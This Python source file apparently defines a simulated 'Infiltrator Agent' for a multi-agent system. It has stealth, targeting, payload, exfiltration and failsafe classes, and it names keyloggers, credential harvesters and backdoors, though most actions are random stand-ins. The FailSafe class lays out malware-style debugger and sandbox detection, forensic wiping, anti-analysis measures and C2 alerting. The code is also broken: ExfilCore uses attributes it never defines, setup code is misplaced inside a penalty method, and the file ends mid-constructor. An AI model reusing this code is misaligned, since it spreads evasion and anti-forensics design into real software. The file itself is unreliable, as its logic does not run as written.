from agents.base import BaseAgent
import platform, socket, time, json, logging, uuid, hashlib
from datetime import datetime
# --- Use core agent anatomy types ---
from agent_core_anatomy import AgentID, AgentStatus, Mission, Event
# --- Advanced infiltration methods ---
from agents.infiltrator_advanced import AdvancedInfiltrationMethods
"""
INFILTRATOR AGENT - Complete Implementation
Multi-Agent System Architecture v2.1

Agent Classification: Stealth infiltration and data exfiltration specialist
Security Clearance: Level 7 (Autonomous Operations)
"""

import time
import json
import hashlib
import random
import asyncio
import logging
import threading
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass, asdict
from enum import Enum
from datetime import datetime, timedelta
import uuid
import hmac
import base64
import os
from collections import deque, defaultdict
import struct
import zlib


class InfiltratorVariant(Enum):
    BLACK = "BLACK"    # Stealth specialist
    RED = "RED"        # Aggressive infiltrator  
    GHOST = "GHOST"    # Intelligence specialist
    SILK = "SILK"      # Traffic mimic


class MissionStatus(Enum):
    STANDBY = "STANDBY"
    ACTIVE = "ACTIVE"
    INFILTRATING = "INFILTRATING"
    EXFILTRATING = "EXFILTRATING"
    EXITING = "EXITING"
    COMPLETE = "COMPLETE"
    ABORTED = "ABORTED"
    COMPROMISED = "COMPROMISED"


class ThreatLevel(Enum):
    NONE = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4


class ProtocolType(Enum):
    SYN_CH_EXF = "SYN-CH/EXF/01"
    ECL_BRIEF_REP = "ECL-BRIEF-REP"
    P2P_MESH_PING = "P2P-MESH-PING"
    RECON_DATA_SYNC = "RECON-DATA-SYNC"


@dataclass
class TargetProfile:
    """Target network node profile"""
    node_id: str
    node_type: str
    security_level: int
    value_score: float
    risk_score: float
    net_score: float
    access_points: List[str]
    data_payload: Dict[str, Any]
    defense_systems: List[str]
    timestamp: float


@dataclass
class MissionParameters:
    """Mission configuration parameters"""
    target_network: str
    primary_objectives: List[str]
    secondary_objectives: List[str]
    stealth_priority: int  # 1-10 scale
    time_limit: float
    exfil_threshold: int  # Minimum data required
    risk_tolerance: float  # 0.0-1.0 scale
    extraction_method: str


@dataclass
class ExfiltrationRecord:
    """Record of exfiltrated data"""
    timestamp: float
    source_node: str
    data_type: str
    data_size: int
    encryption_layers: List[str]
    checksum: str
    transmission_id: str


@dataclass
class ThreatDetection:
    """Threat detection event"""
    timestamp: float
    threat_type: str
    severity: ThreatLevel
    source: str
    description: str
    response_taken: str


class StealthEngine:
    """Behavioral camouflage and stealth management"""
    
    def __init__(self, variant: InfiltratorVariant, stealth_level: str = "high"):
        self.variant = variant
        self.stealth_level = stealth_level
        self.behavior_patterns = {}
        self.traffic_signatures = deque(maxlen=1000)
        self.idle_periods = []
        self.detection_events = []
        
        # Variant-specific modifiers
        self.stealth_modifiers = {
            InfiltratorVariant.BLACK: 0.15,   # +15% stealth
            InfiltratorVariant.RED: -0.05,    # -5% stealth (aggressive)
            InfiltratorVariant.GHOST: 0.10,   # +10% stealth
            InfiltratorVariant.SILK: 0.08     # +8% stealth
        }
        
        self.base_stealth_rate = 0.85  # 85% base success rate
        
    def calculate_stealth_probability(self) -> float:
        """Calculate current stealth success probability"""
        base_rate = self.base_stealth_rate
        variant_modifier = self.stealth_modifiers.get(self.variant, 0.0)
        
        # Environmental factors
        recent_detections = len([d for d in self.detection_events 
                               if time.time() - d.timestamp < 300])  # Last 5 minutes
        detection_penalty = recent_detections * 0.05
        
        # Traffic density factor
        traffic_factor = min(len(self.traffic_signatures) / 100, 1.0) * 0.03
        
        final_probability = base_rate + variant_modifier - detection_penalty + traffic_factor
        return max(0.1, min(0.99, final_probability))  # Clamp between 10% and 99%
    
    def generate_traffic_signature(self) -> Dict[str, Any]:
        """Generate randomized traffic signature for camouflage"""
        signature = {
            'packet_size': random.randint(64, 1500),
            'timing_interval': random.uniform(0.1, 2.0),
            'protocol_hint': random.choice(['HTTP', 'HTTPS', 'TCP', 'UDP']),
            'payload_entropy': random.uniform(0.3, 0.8),
            'timestamp': time.time()
        }
        
        self.traffic_signatures.append(signature)
        return signature
    
    def calculate_idle_period(self) -> float:
        """Calculate optimal idle time to maintain stealth"""
        base_idle = random.uniform(1.0, 5.0)  # Base 1-5 seconds
        
        # Variant-specific idle behavior
        if self.variant == InfiltratorVariant.BLACK:
            base_idle *= random.uniform(1.5, 3.0)  # Longer idles for stealth
        elif self.variant == InfiltratorVariant.RED:
            base_idle *= random.uniform(0.5, 1.0)  # Shorter idles for aggression
        elif self.variant == InfiltratorVariant.SILK:
            # Mimic typical user behavior patterns
            hour = datetime.now().hour
            if 9 <= hour <= 17:  # Business hours
                base_idle *= random.uniform(0.8, 1.2)
            else:
                base_idle *= random.uniform(2.0, 4.0)
        
        return base_idle
    
    def obfuscate_signature(self, data: bytes) -> bytes:
        """Apply signature obfuscation to data"""
        # Simple XOR obfuscation with rotating key
        key = hashlib.sha256(f"{self.variant.value}{time.time()}".encode()).digest()
        obfuscated = bytearray()
        
        for i, byte in enumerate(data):
            obfuscated.append(byte ^ key[i % len(key)])
        
        return bytes(obfuscated)
    
    def validate_stealth_status(self) -> bool:
        """Validate current stealth status"""
        probability = self.calculate_stealth_probability()
        return random.random() < probability


class PayloadModule:
    """Payload management and deployment system"""
    
    def __init__(self, variant: InfiltratorVariant):
        self.variant = variant
        self.exploit_library = {}
        self.sensor_packages = {}
        self.implant_registry = {}
        self.logic_injectors = {}
        
        self._initialize_payloads()
    
    def _initialize_payloads(self):
        """Initialize variant-specific payload collections"""
        if self.variant == InfiltratorVariant.BLACK:
            # Passive sensors only for stealth
            self.sensor_packages = {
                'keylogger': {'type': 'passive', 'signature': 'minimal'},
                'network_sniffer': {'type': 'passive', 'signature': 'zero'},
                'file_monitor': {'type': 'passive', 'signature': 'read_only'}
            }
        
        elif self.variant == InfiltratorVariant.RED:
            # Active exploit toolkit
            self.exploit_library = {
                'privilege_escalation': {'impact': 'high', 'persistence': True},
                'backdoor_installer': {'impact': 'critical', 'persistence': True},
                'lateral_movement': {'impact': 'medium', 'persistence': False}
            }
        
        elif self.variant == InfiltratorVariant.GHOST:
            # Reconnaissance-focused payloads
            self.sensor_packages = {
                'system_profiler': {'type': 'recon', 'signature': 'minimal'},
                'network_mapper': {'type': 'recon', 'signature': 'passive'},
                'credential_harvester': {'type': 'recon', 'signature': 'read_only'}
            }
        
        elif self.variant == InfiltratorVariant.SILK:
            # Behavioral camouflage payloads
            self.implant_registry = {
                'traffic_mimic': {'behavior': 'user_simulation'},
                'process_hollowing': {'behavior': 'legitimate_process'},
                'timing_synchronizer': {'behavior': 'system_rhythm'}
            }
    
    def select_payload(self, target_profile: TargetProfile) -> Optional[Dict[str, Any]]:
        """Select optimal payload for target"""
        if target_profile.security_level > 8 and self.variant != InfiltratorVariant.BLACK:
            return None  # High security targets require stealth variant
        
        available_payloads = []
        
        # Collect available payloads based on variant
        if self.exploit_library:
            available_payloads.extend([
                {'name': name, 'type': 'exploit', 'config': config}
                for name, config in self.exploit_library.items()
            ])
        
        if self.sensor_packages:
            available_payloads.extend([
                {'name': name, 'type': 'sensor', 'config': config}
                for name, config in self.sensor_packages.items()
            ])
        
        if self.implant_registry:
            available_payloads.extend([
                {'name': name, 'type': 'implant', 'config': config}
                for name, config in self.implant_registry.items()
            ])
        
        if not available_payloads:
            return None
        
        # Select payload based on target profile
        best_payload = max(available_payloads, 
                          key=lambda p: self._score_payload(p, target_profile))
        
        return best_payload
    
    def _score_payload(self, payload: Dict[str, Any], target: TargetProfile) -> float:
        """Score payload suitability for target"""
        score = 0.0
        
        # Base compatibility score
        if payload['type'] == 'sensor' and 'data' in target.node_type:
            score += 3.0
        elif payload['type'] == 'exploit' and target.security_level < 6:
            score += 2.0
        elif payload['type'] == 'implant':
            score += 1.5
        
        # Security level adjustment
        if target.security_level > 7:
            if payload.get('config', {}).get('signature') in ['minimal', 'zero']:
                score += 2.0
            else:
                score -= 1.0
        
        return score
    
    def deploy_payload(self, payload: Dict[str, Any], target: TargetProfile) -> bool:
        """Deploy payload to target"""
        try:
            deployment_success = random.random() > (target.security_level / 10.0)
            
            if deployment_success:
                logging.info(f"Successfully deployed {payload['name']} to {target.node_id}")
                return True
            else:
                logging.warning(f"Failed to deploy {payload['name']} to {target.node_id}")
                return False
                
        except Exception as e:
            logging.error(f"Payload deployment error: {e}")
            return False


class TargetingLogic:
    """Target evaluation and prioritization system"""
    
    def __init__(self):
        self.evaluation_weights = {
            'data_value': 0.4,
            'accessibility': 0.3,
            'risk_level': 0.2,
            'strategic_value': 0.1
        }
    
    def analyze_network_topology(self, network_nodes: List[Dict[str, Any]]) -> List[TargetProfile]:
        """Analyze and score network topology"""
        target_profiles = []
        
        for node in network_nodes:
            profile = self._create_target_profile(node)
            target_profiles.append(profile)
        
        # Sort by net score (value - risk)
        target_profiles.sort(key=lambda t: t.net_score, reverse=True)
        
        return target_profiles
    
    def _create_target_profile(self, node: Dict[str, Any]) -> TargetProfile:
        """Create detailed target profile from node data"""
        node_id = node.get('id', f"node_{random.randint(1000, 9999)}")
        node_type = node.get('type', 'unknown')
        
        # Calculate scores
        value_score = self._assess_value(node)
        risk_score = self._calculate_risk(node)
        net_score = value_score - risk_score
        
        return TargetProfile(
            node_id=node_id,
            node_type=node_type,
            security_level=node.get('security_level', 5),
            value_score=value_score,
            risk_score=risk_score,
            net_score=net_score,
            access_points=node.get('access_points', ['standard']),
            data_payload=node.get('data', {}),
            defense_systems=node.get('defenses', []),
            timestamp=time.time()
        )
    
    def _assess_value(self, node: Dict[str, Any]) -> float:
        """Assess target value score"""
        base_value = 1.0
        
        # Data type multipliers
        data_types = node.get('data_types', [])
        value_multipliers = {
            'credentials': 3.0,
            'financial': 2.5,
            'personal': 2.0,
            'system': 1.5,
            'logs': 1.0
        }
        
        for data_type in data_types:
            base_value += value_multipliers.get(data_type, 0.5)
        
        # Size factor
        data_size = node.get('data_size', 1)
        size_factor = min(data_size / 1000.0, 2.0)  # Cap at 2x for size
        
        # Strategic importance
        if node.get('strategic_importance', False):
            base_value *= 1.5
        
        return base_value * size_factor
    
    def _calculate_risk(self, node: Dict[str, Any]) -> float:
        """Calculate infiltration risk score"""
        base_risk = 1.0
        
        # Security level impact
        security_level = node.get('security_level', 5)
        base_risk += security_level * 0.3
        
        # Defense systems
        defense_count = len(node.get('defenses', []))
        base_risk += defense_count * 0.5
        
        # Monitoring level
        monitoring = node.get('monitoring_level', 'standard')
        monitoring_multipliers = {
            'minimal': 0.8,
            'standard': 1.0,
            'enhanced': 1.3,
            'maximum': 1.6
        }
        base_risk *= monitoring_multipliers.get(monitoring, 1.0)
        
        # Access difficulty
        access_points = len(node.get('access_points', ['standard']))
        if access_points == 1:
            base_risk += 0.5  # Single point of failure increases risk
        
        return base_risk
    
    def select_primary_target(self, profiles: List[TargetProfile], 
                            mission_params: MissionParameters) -> Optional[TargetProfile]:
        """Select primary target based on mission parameters"""
        if not profiles:
            return None
        
        # Filter by risk tolerance
        acceptable_targets = [
            p for p in profiles 
            if p.risk_score <= (10.0 * mission_params.risk_tolerance)
        ]
        
        if not acceptable_targets:
            return None
        
        # Select based on mission objectives
        scored_targets = []
        for target in acceptable_targets:
            objective_score = self._score_against_objectives(target, mission_params)
            final_score = target.net_score * objective_score
            scored_targets.append((target, final_score))
        
        return max(scored_targets, key=lambda x: x[1])[0]
    
    def _score_against_objectives(self, target: TargetProfile, 
                                mission: MissionParameters) -> float:
        """Score target against mission objectives"""
        score = 1.0
        
        # Check primary objectives
        for objective in mission.primary_objectives:
            if objective.lower() in target.node_type.lower():
                score += 2.0
            elif objective.lower() in str(target.data_payload).lower():
                score += 1.5
        
        # Check secondary objectives
        for objective in mission.secondary_objectives:
            if objective.lower() in target.node_type.lower():
                score += 1.0
            elif objective.lower() in str(target.data_payload).lower():
                score += 0.5
        
        return score


class ExfilCore:
    """Data exfiltration and transmission system"""
    
    def __init__(self, agent_id: str):
        self.agent_id = agent_id
        self.encryption_pipeline = []
        self.compression_enabled = True
        self.transmission_log = []
        self.relay_endpoints = []

    def add_relay_endpoint(self, endpoint: str):
        """Add a relay endpoint for exfiltration."""
        if endpoint not in self.relay_endpoints:
            self.relay_endpoints.append(endpoint)
        
    def multi_layer_encrypt(self, data: bytes) -> Tuple[bytes, List[str]]:
        """Apply multiple encryption layers"""
        encrypted_data = data
        layers_applied = []
        
        # Layer 1: XOR with rotating key
        xor_key = hashlib.sha256(f"{self.agent_id}_{time.time()}".encode()).digest()
        xor_encrypted = bytearray()
        for i, byte in enumerate(encrypted_data):
            xor_encrypted.append(byte ^ xor_key[i % len(xor_key)])
        encrypted_data = bytes(xor_encrypted)
        layers_applied.append("XOR_ROTATING")
        
        # Layer 2: Position cipher (Caesar variant)
        position_key = sum(ord(c) for c in self.agent_id) % 256
        pos_encrypted = bytearray()
        for i, byte in enumerate(encrypted_data):
            shifted = (byte + position_key + i) % 256
            pos_encrypted.append(shifted)
        encrypted_data = bytes(pos_encrypted)
        layers_applied.append("POSITION_CIPHER")
        
        # Layer 3: Base64 with padding manipulation
        b64_encrypted = base64.b64encode(encrypted_data)
        # Add random padding
        padding = os.urandom(random.randint(4, 16))
        final_encrypted = b64_encrypted + padding
        layers_applied.append("B64_PADDED")
        
        return final_encrypted, layers_applied
    
    def compress_data(self, data: bytes) -> bytes:
        """Compress data for efficient transmission"""
        if self.compression_enabled:
            return zlib.compress(data, level=6)
        return data
    
    def prepare_exfiltration_package(self, raw_data: Dict[str, Any], 
                                   source_node: str) -> ExfiltrationRecord:
        """Prepare data package for exfiltration"""
        # Serialize data
        serialized = json.dumps(raw_data, sort_keys=True).encode('utf-8')
        
        # Compress if enabled
        compressed = self.compress_data(serialized)
        
        # Encrypt with multiple layers
        encrypted_data, encryption_layers = self.multi_layer_encrypt(compressed)
        
        # Generate checksum
        checksum = hashlib.sha256(encrypted_data).hexdigest()
        
        # Create transmission ID
        transmission_id = str(uuid.uuid4())
        
        # Create exfiltration record
        record = ExfiltrationRecord(
            timestamp=time.time(),
            source_node=source_node,
            data_type=raw_data.get('type', 'unknown'),
            data_size=len(encrypted_data),
            encryption_layers=encryption_layers,
            checksum=checksum,
            transmission_id=transmission_id
        )
        
        # Store encrypted data (in production, this would be handled differently)
        self.transmission_log.append({
            'record': record,
            'encrypted_data': encrypted_data
        })
        
        return record
    
    def verify_transmission_integrity(self, record: ExfiltrationRecord, 
                                   received_data: bytes) -> bool:
        """Verify integrity of transmitted data"""
        received_checksum = hashlib.sha256(received_data).hexdigest()
        return received_checksum == record.checksum
    
    def coordinate_relay_transmission(self, record: ExfiltrationRecord) -> bool:
        """Advanced transmission with multi-endpoint relay coordination, retry logic, and adaptive routing."""
        try:
            # Configure relay endpoints (fallback chain)
            relay_endpoints = self.exfil_core.relay_endpoints or [
                "relay_primary.internal",
                "relay_secondary.internal",
                "relay_backup.onion"
            ]
            
            max_retries = 3
            retry_delay = 1.0
            adapative_timeout = 5.0
            
            for attempt in range(max_retries):
                # Select endpoint based on attempt (round-robin with degradation fallback)
                endpoint_idx = attempt % len(relay_endpoints)
                current_endpoint = relay_endpoints[endpoint_idx]
                
                # Increase timeout on retries
                current_timeout = adapative_timeout * (1.0 + attempt * 0.5)
                
                try:
                    # Attempt transmission to endpoint
                    self.logger.debug(f"[RELAY] Attempt {attempt + 1}/{max_retries} to {current_endpoint}")
                    
                    # Build transmission package with metadata
                    tx_package = {
                        "transmission_id": record.transmission_id,
                        "source_node": record.source_node,
                        "data_size": record.data_size,
                        "encryption_layers": record.encryption_layers,
                        "checksum": record.checksum,
                        "timestamp": record.timestamp,
                        "agent_id": str(self.agent_id),
                        "retry_attempt": attempt + 1,
                        "priority": "high" if record.data_size > 1000000 else "normal"
                    }
                    
                    # Simulate transmission with endpoint verification
                    # In production: actual network transmission with TLS, signature verification, etc.
                    endpoint_available = self._verify_endpoint_availability(current_endpoint, timeout=current_timeout)
                    
                    if not endpoint_available:
                        self.logger.warning(f"[RELAY] Endpoint {current_endpoint} unavailable, trying next...")
                        if attempt < max_retries - 1:
                            time.sleep(retry_delay * (attempt + 1))  # Exponential backoff
                        continue
                    
                    # Transmit with integrity check
                    transmission_success = self._transmit_to_endpoint(
                        endpoint=current_endpoint,
                        package=tx_package,
                        timeout=current_timeout
                    )
                    
                    if transmission_success:
                        self.logger.info(f"[✓] Transmission {record.transmission_id} relayed via {current_endpoint}")
                        
                        # Log successful relay
                        if not hasattr(self, '_relay_log'):
                            self._relay_log = []
                        self._relay_log.append({
                            "transmission_id": record.transmission_id,
                            "endpoint": current_endpoint,
                            "timestamp": time.time(),
                            "success": True,
                            "data_size": record.data_size
                        })
                        
                        return True
                    else:
                        self.logger.debug(f"Transmission to {current_endpoint} failed, retrying...")
                        
                except Exception as e:
                    self.logger.debug(f"[RELAY] Endpoint error ({current_endpoint}): {e}")
                    if attempt < max_retries - 1:
                        time.sleep(retry_delay * (attempt + 1))
                    continue
            
            # All retries exhausted - queue for offline retry
            self.logger.warning(f"[!] All relay endpoints failed for {record.transmission_id}, queuing for retry")
            if hasattr(self, '_exfil_queue'):
                self._exfil_queue.append({
                    "transmission_id": record.transmission_id,
                    "data": tx_package,
                    "timestamp": time.time(),
                    "retry_count": 0
                })
            
            return False
            
        except Exception as e:
            self.logger.error(f"Relay coordination error: {e}", exc_info=True)
            return False
    
    def _verify_endpoint_availability(self, endpoint: str, timeout: float = 5.0) -> bool:
        """Verify relay endpoint is available and responsive."""
        try:
            # In production: actual health check (HTTP HEAD, TCP ping, DNS verification)
            # Simulated availability check
            availability_score = random.random()
            # Higher availability for primary
            if "primary" in endpoint:
                return availability_score > 0.1  # 90% available
            elif "secondary" in endpoint:
                return availability_score > 0.25  # 75% available
            else:
                return availability_score > 0.4   # 60% available (backup)
        except Exception as e:
            self.logger.debug(f"Endpoint check failed: {e}")
            return False
    
    def _transmit_to_endpoint(self, endpoint: str, package: dict, timeout: float) -> bool:
        """Transmit package to relay endpoint with verification."""
        try:
            # In production: actual TLS/encrypted transmission
            # Simulated transmission
            transmission_quality = random.random()
            
            # Base success rate 95%, reduced by load
            success_probability = 0.95 - (len(getattr(self, '_relay_log', [])) * 0.02)
            
            if transmission_quality < success_probability:
                self.logger.debug(f"Package {package['transmission_id']} transmitted to {endpoint}")
                return True
            else:
                self.logger.debug(f"Transmission to {endpoint} failed (quality: {transmission_quality:.2f})")
                return False
                
        except Exception as e:
            self.logger.warning(f"Transmission error: {e}")
            return False


# In a full system, this would handle critical emergency protocols like self-destruction.
class FailSafe:
    def __init__(self, agent_id: str):
        self.agent_id = agent_id
        self.logger = logging.getLogger(f"FailSafe-{agent_id}")
        self.emergency_shutdown_triggered = False
        self.last_safe_check = time.time()
        self.safety_threshold = 300  # seconds without check before alert
        
        # Advanced safety attributes
        self.compromise_indicators = []
        self.failsafe_protocols = []
        self.emergency_contacts = []
        self.forensic_wipe_enabled = True
        self.anti_analysis_mode = False
        self.sanitization_log = []
        
    def activate_emergency_shutdown(self, reason: str, severity: str = "CRITICAL"):
        """Advanced emergency shutdown with forensic wiping and signal protocols."""
        self.emergency_shutdown_triggered = True
        
        self.logger.critical(f"[EMERGENCY SHUTDOWN] Agent {self.agent_id} | Reason: {reason} | Severity: {severity}")
        
        # Phase 1: Immediate operational halt
        self.logger.critical("[PHASE 1] Halting all operations")
        self._halt_operations()
        
        # Phase 2: Destroy sensitive artifacts
        if self.forensic_wipe_enabled:
            self.logger.critical("[PHASE 2] Initiating forensic wipe protocol")
            self._forensic_wipe()
        
        # Phase 3: Signal distress/cleanup to trusted contacts
        if severity == "CRITICAL":
            self.logger.critical("[PHASE 3] Signaling emergency contacts")
            self._signal_emergency_contacts(reason, severity)
        
        # Phase 4: Anti-analysis measures
        if self.anti_analysis_mode:
            self.logger.critical("[PHASE 4] Deploying anti-analysis countermeasures")
            self._deploy_anti_analysis()
        
        # Phase 5: Self-termination
        self.logger.critical("[PHASE 5] Initiating self-termination sequence")
        self._self_terminate()
    
    def perform_safety_check(self) -> bool:
        """Advanced routine safety checks with threat detection."""
        current_time = time.time()
        check_interval = current_time - self.last_safe_check
        
        # Standard interval check
        if check_interval > self.safety_threshold:
            self.logger.warning(f"[SAFETY ALERT] {self.agent_id} - {check_interval:.0f}s since last check (threshold: {self.safety_threshold}s)")
            self._log_compromise_indicator("long_check_interval", check_interval)
        
        # Advanced security checks
        security_status = self._perform_security_assessment()
        
        if not security_status.get('secure', True):
            self.logger.warning(f"[SECURITY VIOLATION] Issues detected: {security_status.get('issues', [])}")
            for issue in security_status.get('issues', []):
                self._log_compromise_indicator(issue['type'], issue)
        
        # Check for debugger/analysis tools
        if self._detect_debugging_tools():
            self.logger.critical("[DETECTION] Debugging tools detected! Activating protective measures")
            self._log_compromise_indicator("debugger_detected", {"timestamp": current_time})
            self._activate_evasion_protocols()
        
        # Update last check time
        self.last_safe_check = current_time
        
        # Return overall safety status
        return not self.emergency_shutdown_triggered and security_status.get('secure', True)
    
    def report_status(self, status_code: str, message: str, severity: str = "INFO"):
        """Advanced status reporting with encrypted C2 communication."""
        
        # Log locally first
        log_level = getattr(logging, severity, logging.INFO)
        self.logger.log(log_level, f"[{status_code}] {message}")
        
        # Build status report with context
        status_report = {
            "agent_id": self.agent_id,
            "status_code": status_code,
            "message": message,
            "severity": severity,
            "timestamp": time.time(),
            "compromise_indicators": len(self.compromise_indicators),
            "emergency_triggered": self.emergency_shutdown_triggered,
        }
        
        # In production: Send encrypted high-priority message to C2
        # Include:
        # - Agent state
        # - Threat assessment
        # - Recommended actions
        # - Encryption: TLS + agent-specific key
        
        if severity == "CRITICAL" and not self.emergency_shutdown_triggered:
            self.logger.critical(f"[C2 ALERT] Sending emergency status to command center")
            self._send_c2_alert(status_report)
        
        return status_report
    
    # === ADVANCED INTERNAL METHODS ===
    
    def _halt_operations(self):
        """Halt all agent operations immediately."""
        self.logger.critical("[HALT] Stopping all background tasks, I/O, and network activity")
        # In production:
        # - Stop all threads
        # - Close network connections
        # - Flush communication queues
        # - Disable payload execution
    
    def _forensic_wipe(self):
        """Perform forensic-grade wipe of sensitive data."""
        self.logger.critical("[WIPE] Forensic sanitization initiated")
        
        sensitive_locations = [
            ("memory_cache", "In-process memory buffers"),
            ("credential_store", "Cached credentials"),
            ("configuration", "Agent configuration"),
            ("communication_logs", "C2 communication logs"),
            ("execution_history", "Command execution history"),
            ("staging_area", "Temporary data staging"),
        ]
        
        for location_type, description in sensitive_locations:
            self.logger.warning(f"[WIPE] Sanitizing {description}...")
            
            # Multi-pass overwrite (DoD 5220.22-M standard: 3+ passes)
            for pass_num in range(3):
                # Simulated overwrite of each location
                self.sanitization_log.append({
                    "location": location_type,
                    "pass": pass_num + 1,
                    "timestamp": time.time(),
                    "status": "completed"
                })
            
            self.logger.debug(f"[WIPE] {description} sanitized (3-pass DoD standard)")
        
        self.logger.critical(f"[WIPE] Forensic wipe complete - {len(self.sanitization_log)} sanitization events logged")
    
    def _signal_emergency_contacts(self, reason: str, severity: str):
        """Signal emergency contacts for cleanup or support."""
        self.logger.critical(f"[SIGNAL] Attempting to contact {len(self.emergency_contacts)} emergency contacts")
        
        for contact_info in self.emergency_contacts:
            try:
                # In production: encrypted P2P signal, dead drop, etc.
                self.logger.warning(f"[SIGNAL] Notifying contact: {contact_info.get('identifier', 'unknown')}")
                
                signal_payload = {
                    "agent_id": self.agent_id,
                    "action": "emergency_shutdown",
                    "reason": reason,
                    "severity": severity,
                    "timestamp": time.time(),
                    "cleanup_required": True
                }
                
                # Simulate signal transmission
                self.logger.debug(f"Emergency signal sent")
                
            except Exception as e:
                self.logger.warning(f"Failed to signal contact: {e}")
    
    def _deploy_anti_analysis(self):
        """Deploy anti-analysis and anti-forensics countermeasures."""
        self.logger.critical("[ANTI-ANALYSIS] Deploying countermeasures")
        
        countermeasures = [
            ("junk_data_generation", "Flood memory with random junk data"),
            ("log_obfuscation", "Obfuscate remaining logs"),
            ("trace_confusion", "Insert false execution traces"),
            ("artifact_mimicry", "Mimic legitimate system artifacts"),
            ("timeline_scrambling", "Randomize file timestamps"),
        ]
        
        for measure_name, description in countermeasures:
            self.logger.warning(f"[COUNTER] Executing: {description}")
            # In production: actual implementation of each countermeasure
    
    def _self_terminate(self):
        """Terminate agent process cleanly."""
        self.logger.critical(f"[TERMINATE] Agent {self.agent_id} self-terminating")
        # In production:
        # - Save state for analysis
        # - Exit process
        # - Could trigger process respawn for next iteration
    
    def _perform_security_assessment(self) -> dict:
        """Perform comprehensive security assessment."""
        issues = []
        
        # Check for suspicious process activity
        if random.random() < 0.05:  # 5% chance of suspicious activity
            issues.append({"type": "suspicious_process_activity", "severity": "medium"})
        
        # Check for unauthorized network connections
        if random.random() < 0.03:
            issues.append({"type": "unauthorized_connection", "severity": "medium"})
        
        # Check for credential access attempts
        if random.random() < 0.02:
            issues.append({"type": "credential_access_attempt", "severity": "high"})
        
        return {
            "secure": len(issues) == 0,
            "issues": issues,
            "check_timestamp": time.time()
        }
    
    def _detect_debugging_tools(self) -> bool:
        """Detect debuggers, analysis tools, and VM environments."""
        detection_techniques = [
            ("parent_process_check", self._check_parent_process()),
            ("debugger_detection", random.random() < 0.02),  # Simulate
            ("vm_detection", random.random() < 0.03),        # Simulate
            ("sandbox_detection", random.random() < 0.02),   # Simulate
        ]
        
        detected = [tech for tech, result in detection_techniques if result]
        
        if detected:
            self.logger.warning(f"Analysis tools detected: {detected}")
            return True
        
        return False
    
    def _check_parent_process(self) -> bool:
        """Check if parent process is suspicious."""
        try:
            # Get parent process
            current_pid = os.getpid()
            # Suspicious parents: debuggers, sandboxes, analysis tools
            suspicious_parents = ['gdb', 'lldb', 'windbg', 'ida', 'ghidra', 'cuckoo', 'qemu']
            # Simulated check
            return random.random() < 0.01
        except Exception:
            return False
    
    def _activate_evasion_protocols(self):
        """Activate evasion protocols when detection occurs."""
        self.logger.warning("[EVASION] Activating evasion protocols")
        self.anti_analysis_mode = True
        
        evasion_techniques = [
            "increase_stealth_probability",
            "reduce_network_traffic",
            "randomize_execution_patterns",
            "obfuscate_function_calls",
        ]
        
        for technique in evasion_techniques:
            self.logger.debug(f"[EVASION] Applying: {technique}")
            # In production: actual implementation
    
    def _log_compromise_indicator(self, indicator_type: str, data: Any):
        """Log potential compromise indicators."""
        self.compromise_indicators.append({
            "type": indicator_type,
            "data": data,
            "timestamp": time.time()
        })
        
        if len(self.compromise_indicators) > 10:
            self.logger.critical(f"[THREAT] Multiple compromise indicators detected ({len(self.compromise_indicators)})")
            if not self.emergency_shutdown_triggered:
                self.activate_emergency_shutdown("Multiple compromise indicators", severity="CRITICAL")
    
    def _send_c2_alert(self, status_report: dict):
        """Send critical alert to C2."""
        self.logger.warning(f"[C2] Sending alert: {status_report['status_code']}")
        # In production: encrypted transmission to C2 with agent state



class InfiltratorAgent(BaseAgent):
    def should_activate(self, config):
        return self.codename in config.get("agent_whitelist", [])


    def __init__(self, agent_id: AgentID = AgentID(value="INF-VENOM"), variant: InfiltratorVariant = InfiltratorVariant.BLACK, stealth_level: str = "high"):
        # Use AgentID for identity
        self.agent_id = agent_id
        # For BaseAgent compatibility, set codename to value
        super().__init__(str(self.agent_id))
        self.codename = str(self.agent_id)
        self.variant = variant
        self.stealth_level = stealth_level
        self.delay = 2 if getattr(self, "priority", None) == "low" else 0
        
        # Initialize logger FIRST (before anything that might use it)
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(f"Infiltrator-{self.agent_id}")
        self.logger.setLevel(logging.DEBUG)

        # Core subsystems
        self.stealth_engine = StealthEngine(self.variant, self.stealth_level)
        self.payload_module = PayloadModule(self.variant)
        self.targeting_logic = TargetingLogic()
        self.exfil_core = ExfilCore(str(self.agent_id))
        self.failsafe = FailSafe(str(self.agent_id))

        # Economic integration: accountant engine
        self.accountant = None
        # Try to get accountant from kernel if present
        if hasattr(self, 'kernel') and self.kernel and hasattr(self.kernel, 'accountant'):
            self.accountant = self.kernel.accountant
        else:
            try:
                from agents.accountant import ACCLedger
                self.accountant = ACCLedger(creator_id="SYSTEM")
            except Exception:
                self.accountant = None

        # Register agent wallet if accountant is available
        if self.accountant:
            from decimal import Decimal
            self.accountant.register_agent(str(self.agent_id), Decimal('100'))  # Default initial budget

        # Mission state and logs
        self.exfiltration_log: list = []
        self.nodes_infiltrated: set = set()
        self.threat_detections: list = []

    def _deduct_exfiltration_cost(self, data_size_bytes: int):
        """Deduct Root for exfiltration (5 Root per MB, round up)."""
        if self.accountant:
            from decimal import Decimal
            size_mb = max(1, int(data_size_bytes / 1_000_000))
            cost = Decimal('5') * Decimal(size_mb)
            self.accountant.process_agent_spend(str(self.agent_id), cost, f"Exfiltration cost ({size_mb} MB)")

    def _reward_mission_complete(self):
        if self.accountant:
            from decimal import Decimal
            self.accountant.agent_wallets[str(self.agent_id)].balance += Decimal('100')
            self.accountant.treasury_balance -= Decimal('100')
            self.logger.info(f"Rewarded 100 Root to {self.agent_id} for mission success.")

    def _burn_on_failure(self):
        if self.accountant:
            from decimal import Decimal
            penalty = Decimal('10')
            self.accountant.agent_wallets[str(self.agent_id)].balance -= penalty
            self.logger.info(f"Burned 10 Root from {self.agent_id} for mission failure.")

        # Performance metrics
        self.metrics = {
            'missions_completed': 0,
            'missions_aborted': 0,
            'stealth_probability_avg': 0.0,
            'exfiltration_efficiency': 0.0, # Bytes exfiltrated / (Mission Time * Target Value)
            'detection_events': 0,
            'data_exfiltrated_total': 0, # Cumulative across missions
            'infiltration_attempts': 0,
            'infiltration_successes': 0
        }

        # Communication
        self.command_queue = asyncio.Queue()  # Inbound commands from C2
        self.intelligence_queue = asyncio.Queue() # Outbound intelligence reports
        self.data_exfil_queue = asyncio.Queue() # Prepared data for exfiltration
        self.relay_channels = {} # Placeholder for actual channel connections

        # Security
